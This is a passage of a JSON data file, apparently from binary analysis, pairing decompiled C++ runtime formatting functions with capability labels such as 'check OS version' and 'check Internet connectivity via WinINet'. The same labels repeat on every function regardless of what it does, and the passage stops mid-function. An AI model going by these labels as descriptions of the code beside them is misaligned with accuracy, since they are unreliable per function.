        "decompiled_code": "\nvoid __cdecl fcn.00421e90(uint noname_0, uint *arg_ch, uint arg_10h, int32_t *arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t *piVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    \n    if (arg_1ch != 0) {\n        do {\n            if (arg_14h == NULL) {\ncode_r0x00421edc:\n                arg_10h = CONCAT31(arg_10h._1_3_, 1);\n            }\n            else {\n                if ((*arg_14h[9] == 0) || (piVar1 = arg_14h[0xd],  *piVar1 < 1)) {\n                    uVar3 = (**(*arg_14h + 0xc))(arg_18h);\n                }\n                else {\n                    *piVar1 = *piVar1 + -1;\n                    puVar2 = *arg_14h[9];\n                    *arg_14h[9] = puVar2 + 1;\n                    *puVar2 = arg_18h;\n                    uVar3 = arg_18h;\n                }\n                if (uVar3 == 0xffffffff) goto code_r0x00421edc;\n            }\n            arg_1ch = arg_1ch + -1;\n        } while (arg_1ch != 0);\n    }\n    *arg_ch = arg_10h;\n    arg_ch[1] = arg_14h;\n    return;\n}\n",
        "token_count": 347
    },
    "004221f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004221f0(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f4d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042a3db(0);\n    iVar3 = *0x469078;\n    var_4h = 0;\n    var_10h = *0x469078;\n    if (*0x469080 == 0) {\n        uVar4 = 0;\n        fcn.0042a3db(0);\n        if (*0x469080 == 0) {\n            *0x469080 = *0x469400 + 1;\n            *0x469400 = *0x469080;\n        }\n        fcn.0042a403(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x469080;\n    iVar2 = *arg_8h;\n    if (*0x469080 < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x469080 * 4);\n        if (arg_8h_00 == 0) goto code_r0x00422280;\ncode_r0x0042229e:\n        if (arg_8h_00 != 0) goto code_r0x00422307;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00422280:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0042229e;\n        iVar2 = fcn.0042a4a6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0042229e;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00421fa0(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042b385(0x447a34);\n            fcn.0042ba31(&var_24h, 0x44d5e8);\n        }\n        arg_8h_00 = var_10h;\n        *0x469078 = var_10h;\n        fcn.0042a3db(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.0042a403();\n        fcn.0042a42f(arg_8h_00);\n    }\ncode_r0x00422307:\n    var_4h = 0xffffffff;\n    fcn.0042a403();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 822
    },
    "00422570": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00422570(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_8h_00;\n    int32_t *in_FS_OFFSET;\n    uint uVar4;\n    uint uVar5;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f4d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar5 = 0;\n    fcn.0042a3db(0);\n    iVar3 = *0x46907c;\n    var_4h = 0;\n    var_10h = *0x46907c;\n    if (*0x469084 == 0) {\n        uVar4 = 0;\n        fcn.0042a3db(0);\n        if (*0x469084 == 0) {\n            *0x469084 = *0x469400 + 1;\n            *0x469400 = *0x469084;\n        }\n        fcn.0042a403(uVar4, uVar5, uVar1);\n    }\n    uVar1 = *0x469084;\n    iVar2 = *arg_8h;\n    if (*0x469084 < *(iVar2 + 0xc)) {\n        arg_8h_00 = *(*(iVar2 + 8) + *0x469084 * 4);\n        if (arg_8h_00 == 0) goto code_r0x00422600;\ncode_r0x0042261e:\n        if (arg_8h_00 != 0) goto code_r0x00422687;\n    }\n    else {\n        arg_8h_00 = 0;\ncode_r0x00422600:\n        if (*(iVar2 + 0x14) == '\\0') goto code_r0x0042261e;\n        iVar2 = fcn.0042a4a6();\n        if (uVar1 < *(iVar2 + 0xc)) {\n            arg_8h_00 = *(*(iVar2 + 8) + uVar1 * 4);\n            goto code_r0x0042261e;\n        }\n    }\n    arg_8h_00 = iVar3;\n    if (iVar3 == 0) {\n        iVar3 = fcn.00422330(&var_10h, arg_8h);\n        if (iVar3 == -1) {\n            fcn.0042b385(0x447a34);\n            fcn.0042ba31(&var_24h, 0x44d5e8);\n        }\n        arg_8h_00 = var_10h;\n        *0x46907c = var_10h;\n        fcn.0042a3db(0);\n        if (*(arg_8h_00 + 4) != -1) {\n            *(arg_8h_00 + 4) = *(arg_8h_00 + 4) + 1;\n        }\n        fcn.0042a403();\n        fcn.0042a42f(arg_8h_00);\n    }\ncode_r0x00422687:\n    var_4h = 0xffffffff;\n    fcn.0042a403();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h_00;\n}\n",
        "token_count": 823
    },
    "004226b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004226b0(int32_t *param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    uint arg_8h;\n    uint32_t arg_8h_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_8h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack72;\n    uint32_t var_34h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f520;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack72 = *0x456900 ^ &stack0xfffffffc;\n    puStack20 = &uStack72;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_18h = 0;\n    var_2ch = param_1;\n    var_14h = param_1;\n    puVar3 = &uStack72;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n        puVar3 = puStack20;\n    }\n    puStack20 = puVar3;\n    var_4h = 0;\n    if ((*(*(*param_1 + 4) + 0xc + param_1) == 0) && (*(*(*param_1 + 4) + 0x3c + param_1) != 0)) {\n        fcn.00419780();\n    }\n    var_28h._0_1_ = *(*(*param_1 + 4) + 0xc + param_1) == 0;\n    var_4h = 1;\n    if (var_28h) {\n        arg_8h = fcn.00415720(&var_1ch);\n        var_4h._0_1_ = 2;\n        var_24h = fcn.004221f0(arg_8h);\n        var_4h._0_1_ = 1;\n        if (var_1ch != 0) {\n            fcn.0042a3db(0);\n            iVar2 = *(var_1ch + 4);\n            if ((iVar2 != 0) && (iVar2 != -1)) {\n                *(var_1ch + 4) = iVar2 + -1;\n            }\n            iVar2 = *(var_1ch + 4);\n            fcn.0042a403();\n            puVar5 = ~-(iVar2 != 0) & var_1ch;\n            if (puVar5 != NULL) {\n                (***puVar5)(1);\n            }\n        }\n        iVar2 = *(*param_1 + 4);\n        var_20h = var_20h & 0xffffff00 | *(iVar2 + 0x40 + param_1);\n        var_34h = var_34h & 0xffffff00;\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        (**(*var_24h + 0x1c))(&var_34h, var_34h, *(iVar2 + 0x38 + param_1), *(*param_1 + 4) + param_1, var_20h, var_8h);\n        if (var_34h != '\\0') {\n            var_18h = 4;\n        }\n    }\n    var_4h = 1;\n    if (var_18h != 0) {\n        arg_8h_00 = *(param_1 + *(*param_1 + 4) + 0xc) | var_18h;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            arg_8h_00 = arg_8h_00 | 4;\n        }\n        fcn.00418a20(arg_8h_00, 0);\n    }\n    var_4h = 5;\n    cVar4 = fcn.0042ab54();\n    if (cVar4 == '\\0') {\n        fcn.00422130();\n    }\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_4h = 0xffffffff;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 1136
    },
    "004228a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t * __thiscall fcn.004228a0(int32_t *param_1, float param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    char cVar4;\n    uint arg_8h;\n    uint32_t arg_8h_00;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint32_t uStack72;\n    uint32_t var_34h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    int32_t *var_14h;\n    uint32_t *puStack20;\n    int32_t var_ch_2;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f560;\n    var_ch_2 = *in_FS_OFFSET;\n    uStack72 = *0x456900 ^ &stack0xfffffffc;\n    puStack20 = &uStack72;\n    *in_FS_OFFSET = &var_ch_2;\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_18h = 0;\n    var_2ch = param_1;\n    var_14h = param_1;\n    puVar3 = &uStack72;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 4))();\n        puVar3 = puStack20;\n    }\n    puStack20 = puVar3;\n    var_4h = 0;\n    if ((*(*(*param_1 + 4) + 0xc + param_1) == 0) && (*(*(*param_1 + 4) + 0x3c + param_1) != 0)) {\n        fcn.00419780();\n    }\n    var_28h._0_1_ = *(*(*param_1 + 4) + 0xc + param_1) == 0;\n    var_4h = 1;\n    if (var_28h) {\n        arg_8h = fcn.00415720(&var_1ch);\n        var_4h._0_1_ = 2;\n        var_24h = fcn.004221f0(arg_8h);\n        var_4h._0_1_ = 1;\n        if (var_1ch != 0) {\n            fcn.0042a3db(0);\n            iVar2 = *(var_1ch + 4);\n            if ((iVar2 != 0) && (iVar2 != -1)) {\n                *(var_1ch + 4) = iVar2 + -1;\n            }\n            iVar2 = *(var_1ch + 4);\n            fcn.0042a403();\n            puVar5 = ~-(iVar2 != 0) & var_1ch;\n            if (puVar5 != NULL) {\n                (***puVar5)();\n            }\n        }\n        iVar2 = *(*param_1 + 4);\n        var_20h = var_20h & 0xffffff00 | *(iVar2 + 0x40 + param_1);\n        var_34h = var_34h & 0xffffff00;\n        var_4h = CONCAT31(var_4h._1_3_, 3);\n        (**(*var_24h + 0xc))(&var_34h, var_34h, *(iVar2 + 0x38 + param_1), *(*param_1 + 4) + param_1, var_20h, param_2);\n        if (var_34h != '\\0') {\n            var_18h = 4;\n        }\n    }\n    var_4h = 1;\n    if (var_18h != 0) {\n        arg_8h_00 = *(param_1 + *(*param_1 + 4) + 0xc) | var_18h;\n        if (*(param_1 + *(*param_1 + 4) + 0x38) == 0) {\n            arg_8h_00 = arg_8h_00 | 4;\n        }\n        fcn.00418a20(arg_8h_00, 0);\n    }\n    var_4h = 5;\n    cVar4 = fcn.0042ab54();\n    if (cVar4 == '\\0') {\n        fcn.00422130();\n    }\n    piVar1 = *(*(*param_1 + 4) + 0x38 + param_1);\n    var_4h = 0xffffffff;\n    if (piVar1 != NULL) {\n        (**(*piVar1 + 8))();\n    }\n    *in_FS_OFFSET = var_ch_2;\n    return param_1;\n}\n",
        "token_count": 1124
    },
    "00422be0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.00422be0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint *arg_20h, \n            int32_t arg_24h, int32_t arg_28h, int32_t arg_2ch, int32_t arg_30h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    char **ppcVar7;\n    int32_t iVar8;\n    uint *arg_8h_00;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint *puVar11;\n    int32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t *var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    uint32_t var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint *var_48h;\n    uint32_t var_34h;\n    uint *var_2ch;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f5c8;\n    var_ch = *in_FS_OFFSET;\n    uVar5 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_84h = arg_ch;\n    var_6ch = arg_28h;\n    var_58h = arg_24h;\n    puVar11 = &var_70h;\n    var_78h = arg_18h;\n    var_54h = arg_2ch;\n    var_4ch = arg_30h;\n    var_10h = uVar5;\n    uVar6 = fcn.00415720(puVar11);\n    var_4h = 0;\n    var_7ch = fcn.00422570(uVar6);\n    uVar9 = var_70h;\n    var_4h = 0xffffffff;\n    if (var_70h != 0) {\n        uVar6 = 0;\n        var_60h = var_70h;\n        fcn.0042a3db(0);\n        iVar8 = *(uVar9 + 4);\n        if ((iVar8 != 0) && (iVar8 != -1)) {\n            *(uVar9 + 4) = iVar8 + -1;\n        }\n        iVar8 = *(uVar9 + 4);\n        fcn.0042a403(uVar6, puVar11, uVar5);\n        puVar11 = ~-(iVar8 != 0) & var_60h;\n        if (puVar11 != NULL) {\n            (***puVar11)(1);\n        }\n    }\n    piVar3 = var_7ch;\n    fcn.004221d0(&var_48h);\n    var_4h = 1;\n    uVar4 = (**(*piVar3 + 8))();\n    var_60h = var_60h & 0xffffff00 | uVar4;\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    var_4h = CONCAT31(var_4h._1_3_, 2);\n    if ((*arg_20h == '+') || (var_64h = 0,  *arg_20h == '-')) {\n        var_64h = 1;\n    }\n    ppcVar7 = fcn.0042eac1();\n    var_5ch._0_1_ = **ppcVar7;\n    var_5ch._1_2_ = 0x65;\n    iVar8 = fcn.0042d790(arg_20h, 0x65, arg_30h);\n    var_50h = fcn.0042d790(arg_20h, var_5ch, arg_30h);\n    if (var_50h == 0) {\n        var_54h = var_50h;\n    }\n    puVar11 = var_48h;\n    if (var_34h < 0x10) {\n        puVar11 = &var_48h;\n    }\n    if (*puVar11 != '\\x7f') {\n        puVar11 = var_48h;\n        if (var_34h < 0x10) {\n            puVar11 = &var_48h;\n        }\n        if ('\\0' < *puVar11) {\n            fcn.0040baf0(arg_20h, arg_30h);\n            iVar10 = var_50h;\n            if (iVar8 == 0) {\n                fcn.0040bc10(var_54h, 0x30);\n                iVar10 = var_50h;\n            }\n            else {\n                if (var_50h == 0) {\n                    fcn.0040bc10(var_58h, 0x30);\n                    var_58h = iVar10;\n                }\n                var_80h = 0x30;\n                var_84h = var_54h;\n                fcn.00422470(iVar8 - arg_20h, var_54h, 0x30);\n            }\n            if (iVar10 == 0) {\n                fcn.0040bc10(var_58h, 0x30);\n            }\n            else {\n                unaff_EDI = var_6ch;\n                fcn.00422470((iVar10 - arg_20h) + 1, var_6ch, 0x30);\n                fcn.00422470(iVar10 - arg_20h, var_58h, 0x30);\n                var_6ch = 0;\n            }\n            var_58h = 0;\n            puVar11 = var_48h;\n            if (var_34h < 0x10) {\n                puVar11 = &var_48h;\n            }\n            arg_8h_00 = var_2ch;\n            if (var_18h < 0x10) {\n                arg_8h_00 = &var_2ch;\n            }\n            iVar8 = fcn.0042eaf0(arg_8h_00, &var_5ch);\n            cVar1 = *puVar11;\n            arg_30h = var_1ch;\n            while (((var_1ch = arg_30h,  cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < iVar8 - var_64h))) {\n                iVar8 = iVar8 - cVar1;\n                fcn.00422470(iVar8, 1, 0);\n                if ('\\0' < *(puVar11 + 1)) {\n                    puVar11 = puVar11 + 1;\n                }\n                arg_30h = var_1ch;\n                cVar1 = *puVar11;\n            }\n            arg_20h = var_2ch;\n            if (var_18h < 0x10) {\n                arg_20h = &var_2ch;\n            }\n            var_54h = 0;\n            var_4ch = arg_30h;\n        }\n    }\n    uVar9 = *(var_78h + 0x20);\n    uVar5 = var_54h + arg_30h + var_6ch + var_58h;\n    if (((*(var_78h + 0x24) < 0) || ((*(var_78h + 0x24) < 1 && (uVar9 == 0)))) || (uVar9 <= uVar5)) {\n        var_50h = 0;\n    }\n    else {\n        var_50h = uVar9 - uVar5;\n    }\n    uVar9 = *(var_78h + 0x14) & 0x1c0;\n    if (uVar9 != 0x40) {\n        if (uVar9 == 0x100) {\n            if (var_64h != 0) {\n                puVar11 = fcn.00421e20(arg_8h, &var_68h, arg_10h, arg_14h, arg_20h, 1);\n                arg_10h = *puVar11;\n                arg_14h = puVar11[1];\n                arg_20h = arg_20h + 1;\n                arg_30h = arg_30h + -1;\n                var_4ch = arg_30h;\n            }\n            puVar11 = fcn.00421e90(arg_8h, &var_68h, arg_10h, arg_14h, arg_1ch, var_50h);\n            arg_10h = *puVar11;\n            arg_14h = puVar11[1];\n        }\n        else {\n            puVar11 = fcn.00421e90(arg_8h, &var_68h, arg_10h, arg_14h, arg_1ch, var_50h);\n            arg_10h = *puVar11;\n            arg_14h = puVar11[1];\n        }\n        var_50h = 0;\n    }\n    iVar8 = fcn.0042d790(arg_20h, var_5ch, arg_30h);\n    if (iVar8 != 0) {\n        arg_30h = (iVar8 - arg_20h) + 1;\n        puVar11 = fcn.00421f00(arg_8h, &var_68h, arg_10h, arg_14h, arg_20h, iVar8 - arg_20h, var_60h);\n        puVar11 = fcn.00421e90(arg_8h, &var_68h, *puVar11, puVar11[1], 0x30, var_58h);\n        uVar6 = *puVar11;\n        uVar2 = puVar11[1];\n        uVar4 = (**(*var_7ch + 4))();\n        var_70h = var_70h & 0xffffff00 | uVar4;\n        puVar11 = fcn.00421e90(arg_8h, &var_80h, uVar6, uVar2, var_70h, 1);\n        puVar11 = fcn.00421e90(arg_8h, &var_74h, *puVar11, puVar11[1], 0x30, var_6ch);\n        arg_10h = *puVar11;\n        arg_20h = arg_20h + arg_30h;\n        arg_30h = var_4ch - arg_30h;\n        arg_14h = puVar11[1];\n        var_4ch = arg_30h;\n    }\n    iVar8 = fcn.0042d790(arg_20h, 0x65, arg_30h);\n    if (iVar8 != 0) {\n        arg_30h = (iVar8 - arg_20h) + 1;\n        puVar11 = fcn.00421f00(arg_8h, &var_74h, arg_10h, arg_14h, arg_20h, iVar8 - arg_20h, var_60h);\n        puVar11 = fcn.00421e90(arg_8h, &var_74h, *puVar11, puVar11[1], 0x30, var_54h);\n        var_54h = 0;\n        uVar6 = 0x447c64;\n        if ((*(var_78h + 0x14) & 4) == 0) {\n            uVar6 = 0x447278;\n        }\n        puVar11 = fcn.00421e20(arg_8h, &var_74h, *puVar11, puVar11[1], uVar6, 1);\n        arg_10h = *puVar11;\n        arg_20h = arg_20h + arg_30h;\n        arg_30h = var_4ch - arg_30h;\n        arg_14h = puVar11[1];\n        var_4ch = arg_30h;\n    }\n    puVar11 = fcn.00421f00(arg_8h, &var_74h, arg_10h, arg_14h, arg_20h, arg_30h, var_60h);\n    puVar11 = fcn.00421e90(arg_8h, &var_80h, *puVar11, puVar11[1], 0x30, var_54h);\n    uVar6 = *puVar11;\n    uVar2 = puVar11[1];\n    *(var_78h + 0x20) = 0;\n    *(var_78h + 0x24) = 0;\n    fcn.00421e90(arg_8h, var_84h, uVar6, uVar2, arg_1ch, var_50h);\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    var_18h = 0xf;\n    var_1ch = 0;\n    var_2ch = var_2ch & 0xffffff00;\n    if (0xf < var_34h) {\n        fcn.0042ac49(var_48h);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_EDI);\n    return;\n}\n",
        "token_count": 3213
    },
    "00423150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00423150(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, char *arg_20h, \n            uint32_t arg_24h)\n\n{\n    char cVar1;\n    uint arg_14h_00;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint unaff_EDI;\n    uint *puVar7;\n    int32_t *in_FS_OFFSET;\n    uint var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint *var_44h;\n    uint32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint *var_2ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f600;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_4ch = arg_ch;\n    puVar7 = &var_40h;\n    var_3ch = arg_18h;\n    var_30h = arg_24h;\n    var_10h = uVar3;\n    uVar4 = fcn.00415720(puVar7);\n    var_4h = 0;\n    var_50h = fcn.00422570(uVar4);\n    uVar6 = var_40h;\n    var_4h = 0xffffffff;\n    if (var_40h != 0) {\n        uVar4 = 0;\n        fcn.0042a3db(0);\n        iVar5 = *(uVar6 + 4);\n        if ((iVar5 != 0) && (iVar5 != -1)) {\n            *(uVar6 + 4) = iVar5 + -1;\n        }\n        iVar5 = *(uVar6 + 4);\n        fcn.0042a403(uVar4, puVar7, uVar3);\n        puVar7 = ~-(iVar5 != 0) & uVar6;\n        if (puVar7 != NULL) {\n            (***puVar7)(1);\n        }\n    }\n    fcn.004221d0(&var_2ch);\n    cVar1 = *arg_20h;\n    var_4h = 1;\n    if ((cVar1 == '+') || (cVar1 == '-')) {\n        var_34h = 1;\n    }\n    else if ((cVar1 == '0') && ((arg_20h[1] == 'x' || (arg_20h[1] == 'X')))) {\n        var_34h = 2;\n    }\n    else {\n        var_34h = 0;\n    }\n    puVar7 = var_2ch;\n    if (var_18h < 0x10) {\n        puVar7 = &var_2ch;\n    }\n    if (*puVar7 != '\\x7f') {\n        puVar7 = var_2ch;\n        if (var_18h < 0x10) {\n            puVar7 = &var_2ch;\n        }\n        if ('\\0' < *puVar7) {\n            var_44h = var_2ch;\n            if (var_18h < 0x10) {\n                var_44h = &var_2ch;\n            }\n            cVar1 = *var_44h;\n            uVar6 = var_30h;\n            while (((cVar1 != '\\x7f' && ('\\0' < cVar1)) && (cVar1 < uVar6 - var_34h))) {\n                uVar6 = uVar6 - cVar1;\n                iVar5 = (var_30h - uVar6) + 1;\n                fcn.0042eb36(arg_20h + uVar6 + 1, iVar5, arg_20h + uVar6, iVar5);\n                var_30h = var_30h + 1;\n                arg_20h[uVar6] = '\\0';\n                if ('\\0' < *(var_44h + 1)) {\n                    var_44h = var_44h + 1;\n                }\n                cVar1 = *var_44h;\n            }\n        }\n    }\n    uVar6 = *(var_3ch + 0x20);\n    if (((*(var_3ch + 0x24) < 0) || ((*(var_3ch + 0x24) < 1 && (uVar6 == 0)))) || (uVar6 <= var_30h)) {\n        iVar5 = 0;\n    }\n    else {\n        iVar5 = uVar6 - var_30h;\n    }\n    uVar6 = *(var_3ch + 0x14) & 0x1c0;\n    if (uVar6 != 0x40) {\n        if (uVar6 == 0x100) {\n            puVar7 = fcn.00421e20(arg_8h, &var_48h, arg_10h, arg_14h, arg_20h, var_34h);\n            var_30h = var_30h - var_34h;\n            arg_20h = arg_20h + var_34h;\n            puVar7 = fcn.00421e90(arg_8h, &var_38h, *puVar7, puVar7[1], arg_1ch, iVar5);\n            arg_10h = *puVar7;\n            arg_14h = puVar7[1];\n        }\n        else {\n            puVar7 = fcn.00421e90(arg_8h, &var_38h, arg_10h, arg_14h, arg_1ch, iVar5);\n            arg_10h = *puVar7;\n            arg_14h = puVar7[1];\n        }\n        iVar5 = 0;\n    }\n    uVar2 = (**(*var_50h + 8))();\n    var_40h = var_40h & 0xffffff00 | uVar2;\n    puVar7 = fcn.00421f00(arg_8h, &var_54h, arg_10h, arg_14h, arg_20h, var_30h, var_40h);\n    uVar4 = *puVar7;\n    arg_14h_00 = puVar7[1];\n    *(var_3ch + 0x20) = 0;\n    *(var_3ch + 0x24) = 0;\n    fcn.00421e90(arg_8h, var_4ch, uVar4, arg_14h_00, arg_1ch, iVar5);\n    if (0xf < var_18h) {\n        fcn.0042ac49(var_2ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0042ad2a(unaff_EDI);\n    return;\n}\n",
        "token_count": 1656
    },
    "004234e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004234e0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint32_t arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    uint arg_14h_00;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    int32_t *in_ECX;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint32_t var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint32_t var_34h;\n    uint *var_2ch;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x43f6a0;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x456900 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_54h = arg_8h;\n    var_4ch = var_4ch & 0xffffff00 | arg_18h & 0xff;\n    var_10h = arg_8h_00;\n    if ((*(arg_14h + 0x14) & 0x4000) == 0) {\n        (**(*in_ECX + 0x1c))(arg_8h, arg_ch, arg_10h, arg_14h, var_4ch, arg_1ch);\n    }\n    else {\n        uVar2 = fcn.00415720(&var_58h);\n        var_4h = 0;\n        var_5ch = fcn.00422570(uVar2);\n        var_4h = 0xffffffff;\n        if (var_58h != 0) {\n            var_50h = var_58h;\n            fcn.0042a3db(0);\n            iVar4 = *(var_58h + 4);\n            if ((iVar4 != 0) && (iVar4 != -1)) {\n                *(var_58h + 